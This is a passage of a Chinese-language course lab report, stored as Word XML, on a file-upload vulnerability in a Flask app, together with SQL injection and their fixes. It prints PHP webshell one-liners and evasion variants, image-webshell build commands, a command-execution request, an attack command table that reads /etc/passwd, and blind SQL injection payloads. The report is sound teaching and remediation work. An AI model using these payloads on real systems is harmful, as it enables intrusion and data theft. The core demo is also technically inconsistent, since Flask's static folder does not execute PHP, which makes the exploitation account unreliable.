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1A2E"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>文件上传漏洞分析与修复报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="454545"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>——基于 Flask 的一句话木马上传漏洞实验——</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>实验项目：Web 安全漏洞分析与修复</w:t>
        <w:br/>
        <w:t>课程名称：网络安全实训</w:t>
        <w:br/>
        <w:t>报告日期：2026年7月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after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第1章  漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第2章  一句话木马原理详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第3章  实验环境与代码分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第4章  漏洞复现步骤（Burp Suite实操）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第5章  图片马（JPEG/PNG隐藏木马）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第6章  布尔盲注与SQL注入联动分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第7章  修复方案详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第8章  修复前后代码对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第9章  安全编码规范总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第一章  漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>文件上传漏洞（Unrestricted File Upload）是OWASP Top 10中常见的高危漏洞。攻击者通过上传包含恶意代码的文件（如一句话木马/WebShell），可以获得Web服务器的远程控制权限，执行任意系统命令、窃取数据、横向移动等。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 漏洞危害等级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评估项</w:t>
            </w:r>
          </w:p>
        </w:tc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详情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CVSS 3.0评分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9.8（Critical）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攻击向量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网络远程攻击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影响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完全控制服务器</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 漏洞成因</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次Flask应用上传功能存在三个关键安全问题：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFCDD2" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>🔴 漏洞1：无文件后缀名检查——允许上传.php、.phtml等可执行脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFCDD2" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>🔴 漏洞2：无MIME类型检查——不验证Content-Type</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFCDD2" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>🔴 漏洞3：使用原始文件名保存——存在路径穿越风险(../)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第二章  一句话木马原理详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 什么是一句话木马</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>一句话木马（WebShell）是一段极短的恶意代码（通常仅几十字节），攻击者将其隐藏在上传的文件中。当服务器处理该文件时，木马代码被执行，攻击者通过HTTP请求控制服务器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 经典PHP一句话木马</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>最基本的PHP一句话木马仅22个字节：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php @eval($_POST["cmd"]); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 代码拆解分析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代码段</w:t>
            </w:r>
          </w:p>
        </w:tc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&lt;?php...?&gt;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PHP代码标记，执行中间代码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@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错误抑制符，隐藏输出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eval()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将字符串作PHP代码执行——核心危险函数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$_POST["cmd"]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接收HTTP POST的cmd参数</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 一句话木马变种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木马代码</w:t>
            </w:r>
          </w:p>
        </w:tc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&lt;?php @system($_REQUEST["cmd"]); ?&gt;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用system()替代eval()，直接执行系统命令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&lt;?php @assert($_POST["cmd"]); ?&gt;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用assert()绕过部分WAF检测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&lt;?php $_GET["a"]($_POST["b"]); ?&gt;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变量函数调用，?a=assert动态执行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&lt;script language="php"&gt;...&lt;/script&gt;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Script标签形式绕过&lt;?php过滤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GIF89a&lt;?php @eval($_POST["cmd"]); ?&gt;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GIF文件头+一句话木马</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第三章  实验环境与代码分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 开发环境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Web框架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Python Flask 3.1.3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数据库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SQLite 3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操作系统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Kali Linux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攻击工具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Burp Suite / 蚁剑 / curl</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 有漏洞代码（app.py）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>/upload路由核心代码，标注了所有安全漏洞位置：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "static", "uploads")</w:t>
        <w:br/>
        <w:t>app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/upload", methods=["GET","POST"])</w:t>
        <w:br/>
        <w:t>def upload():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "username" not in session:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return redirect("/login")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        f = request.files["file"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # ⚠️ 漏洞1：不做文件类型检查</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # ⚠️ 漏洞2：不检查后缀</w:t>
        <w:br/>
        <w:t xml:space="preserve">        filename = f.filename  # ⚠️ 漏洞3：用原始文件名</w:t>
        <w:br/>
        <w:t xml:space="preserve">        save_path = os.path.join(UPLOAD_DIR, filename)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        f.save(save_path)  # ⚠️ 路径穿越风险</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第四章  漏洞复现步骤（Burp Suite实操）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 准备一句话木马</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>echo '&lt;?php @eval($_POST["cmd"]); ?&gt;' &gt; shell.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 登录系统</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>使用默认管理员账号登录：http://192.168.199.128:5000/login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>账号：admin / 密码：admin123（见HTML注释泄露）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 上传木马</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>登录后访问 /upload 页面，选择 shell.php 上传。系统无任何检查，上传成功。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://192.168.199.128:5000/static/uploads/shell.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 Burp Suite拦截+发送恶意请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>使用Burp Suite拦截上传请求，可以观察到：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>原始文件名未被修改</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Content-Type未被验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>无任何文件类型检查</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>发送POST请求执行系统命令：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /static/uploads/shell.php HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 192.168.199.128:5000</w:t>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
        <w:br/>
        <w:br/>
        <w:t>cmd=system('whoami');</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 常用攻击命令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POST参数</w:t>
            </w:r>
          </w:p>
        </w:tc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执行效果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cmd=system('whoami');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查看当前用户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cmd=system('ls -la');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列出目录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cmd=system('cat /etc/passwd');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读取密码文件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cmd=system('ifconfig');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查看网络配置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cmd=phpinfo();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查看PHP配置</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第五章  图片马（JPEG/PNG隐藏木马）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>图片马（Image WebShell）将一句话木马隐藏在合法图片中。图片查看器只解析图像数据，而PHP服务器会执行文件中的所有PHP代码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 JPEG图片马</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>JPEG以FF D8开头、FF D9结束。图片查看器读到FF D9后停止，PHP引擎继续扫描&lt;?php?&gt;。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 创建合法JPEG文件头</w:t>
        <w:br/>
        <w:t>printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01...' &gt; shell.jpg</w:t>
        <w:br/>
        <w:t># 尾部追加一句话木马</w:t>
        <w:br/>
        <w:t>echo '&lt;?php @eval($_POST["cmd"]); ?&gt;' &gt;&gt; shell.jpg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 PNG图片马</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 方法1：文件尾部追加</w:t>
        <w:br/>
        <w:t>cat base.png &gt; shell.png</w:t>
        <w:br/>
        <w:t>echo '&lt;?php @eval($_POST["cmd"]); ?&gt;' &gt;&gt; shell.png</w:t>
        <w:br/>
        <w:br/>
        <w:t># 方法2：PNG tEXt元数据块嵌入（更隐蔽）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 图片马原理图解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>JPEG文件结构：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>[FF D8][JFIF头][图像数据][FF D9][&lt;?php @eval($_POST["cmd"]); ?&gt;]</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↑ JPEG解析到此↑              ↑ PHP从这里执行↑</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>PNG文件结构：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>[89 50 4E 47][IHDR][IDAT][IEND][&lt;?php @eval($_POST["cmd"]); ?&gt;]</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↑ PNG解析到此↑              ↑ PHP从这里执行↑</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第六章  布尔盲注与SQL注入联动分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 判断注入点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输入</w:t>
            </w:r>
          </w:p>
        </w:tc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页面响应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admin' --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登录成功✅ 存在注入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admin' OR '1'='1' --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登录成功✅ 返回所有用户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' AND 1=2 --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登录失败❌ 条件为假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' AND 1=1 --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登录成功✅ 布尔盲注可行</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 布尔盲注猜解数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>利用True/False响应逐字符猜解：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="FFEBEE" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 猜解数据库名长度</w:t>
        <w:br/>
        <w:t>' AND LENGTH(database())=4 --  → 正常 → 长度=4</w:t>
        <w:br/>
        <w:t># 逐字符猜解</w:t>
        <w:br/>
        <w:t>' AND SUBSTR(database(),1,1)='t' -- → 正常 → 第1字符=t</w:t>
        <w:br/>
        <w:t>' AND SUBSTR(database(),2,1)='e' -- → 正常 → 第2字符=e</w:t>
        <w:br/>
        <w:t>' AND SUBSTR(database(),3,1)='s' -- → 正常 → 第3字符=s</w:t>
        <w:br/>
        <w:t>' AND SUBSTR(database(),4,1)='t' -- → 正常 → 第4字符=t</w:t>
        <w:br/>
        <w:t>→ 数据库名: test</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>完整攻击链：</w:t>
      </w:r>
      <w:r>
        <w:t>SQL注入窃取管理员密码 → 登录系统 → 上传一句话木马 → 获得服务器控制权</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第七章  修复方案详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 文件后缀白名单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="C8E6C9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✅ 只允许上传特定图片格式，拒绝所有可执行脚本后缀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="E8F5E9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"}</w:t>
        <w:br/>
        <w:t>ext = os.path.splitext(f.filename)[1].lower()</w:t>
        <w:br/>
        <w:t>if ext not in ALLOWED_EXTENSIONS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "不支持的文件类型"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 UUID重命名</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="C8E6C9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✅ 使用UUID随机字符串重命名，防止路径穿越</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="E8F5E9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>import uuid</w:t>
        <w:br/>
        <w:t>safe_filename = uuid.uuid4().hex + ext</w:t>
        <w:br/>
        <w:t>save_path = os.path.join(UPLOAD_DIR, safe_filename)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 MIME类型验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="C8E6C9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✅ 使用python-magic检测真实文件魔数，防止伪造扩展名</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="E8F5E9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>import magic</w:t>
        <w:br/>
        <w:t>mime_type = magic.from_file(save_path, mime=True)</w:t>
        <w:br/>
        <w:t>if not mime_type.startswith("image/"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    os.remove(save_path)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "文件内容不合法"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 上传目录权限控制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="C8E6C9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✅ 配置Web服务器禁止上传目录执行脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="E8F5E9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Nginx配置</w:t>
        <w:br/>
        <w:t>location /static/uploads/ {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    location ~ \.php$ { deny all; }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.5 参数化查询修复SQL注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="C8E6C9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✅ 使用参数化查询替代字符串拼接</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="E8F5E9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># ❌ 漏洞：字符串拼接</w:t>
        <w:br/>
        <w:t>sql = f"SELECT * FROM users WHERE username = '{username}'"</w:t>
        <w:br/>
        <w:br/>
        <w:t># ✅ 修复：参数化查询</w:t>
        <w:br/>
        <w:t>cursor.execute("SELECT * FROM users WHERE username = ?", (username,))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.6 综合安全建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>最小权限原则：Web进程运行在低权限用户下，上传目录不可执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>纵深防御：后缀检查+MIME检测+UUID重命名+目录权限控制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>日志审计：记录所有上传操作（文件名/IP/时间/用户）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WAF规则：拦截eval、system等敏感函数调用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>定期扫描：使用漏洞扫描工具检查已上传文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第八章  修复前后代码对比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对比项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有漏洞(app.py)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已修复(app_fixed.py)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文件后缀检查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 无检查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白名单限制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文件命名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 原始文件名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UUID.hex+后缀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MIME类型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 无验证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magic文件头检测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路径穿越防护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 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UUID天然防护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SQL注入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 字符串拼接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参数化查询</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>修复版完整代码（app_fixed.py上传部分）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:shd w:fill="E8F5E9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># ✅ 安全的文件上传</w:t>
        <w:br/>
        <w:t>ALLOWED_EXTENSIONS = {".jpg",".jpeg",".png",".gif",".bmp",".webp"}</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/upload", methods=["GET","POST"])</w:t>
        <w:br/>
        <w:t>def upload():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "username" not in session:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return redirect("/login")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        f = request.files["file"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ext = os.path.splitext(f.filename)[1].lower()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # ✅ 后缀白名单</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if ext not in ALLOWED_EXTENSIONS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return render_template("upload_fixed.html", upload_msg="不支持的文件类型")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # ✅ UUID重命名</w:t>
        <w:br/>
        <w:t xml:space="preserve">        safe_filename = uuid.uuid4().hex + ext</w:t>
        <w:br/>
        <w:t xml:space="preserve">        save_path = os.path.join(UPLOAD_DIR, safe_filename)</w:t>
        <w:br/>
